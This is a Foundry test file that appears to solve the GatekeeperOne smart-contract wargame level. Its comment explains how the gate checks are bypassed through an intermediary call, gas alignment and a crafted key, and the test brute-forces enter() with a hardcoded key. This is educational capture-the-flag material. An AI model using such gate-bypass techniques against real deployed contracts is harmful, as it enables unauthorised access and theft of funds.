// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";

/**
 * @title GatekeeperOne Attack Test
 * @notice Demonstrates the exploitation of complex gate conditions in the GatekeeperOne contract
 *
 * @dev The vulnerability exists because:
 * - `gateOne` requires `msg.sender` to be different from `tx.origin`, preventing direct EOA calls.
 * - `gateTwo` requires the remaining gas to be a multiple of 8191, necessitating precise gas management.
 * - `gateThree` involves three checks on `_gateKey` that require exact bit alignment with `tx.origin`.
 *
 * Attack flow:
 * 1. Use an intermediary contract to bypass `gateOne`.
 * 2. Manage the gas sent to match the requirement of `gateTwo`.
 * 3. Carefully craft `_gateKey` to meet the conditions of `gateThree`.
 */
contract GatekeeperOneTest is Test {
    GatekeeperOne public gatekeeperOne;

    mapping(address => uint256) public gasLeft;

    function setUp() public {
        gatekeeperOne = new GatekeeperOne();
    }

    function testEnter() public {
        bytes8 gateKey = bytes8(uint64(0x000100001F38));
        bool success;

        while (!success) {
            (success,) = address(gatekeeperOne).call(abi.encodeWithSelector(gatekeeperOne.enter.selector, gateKey));
        }

        assertEq(gatekeeperOne.entrant(), tx.origin);
    }
}
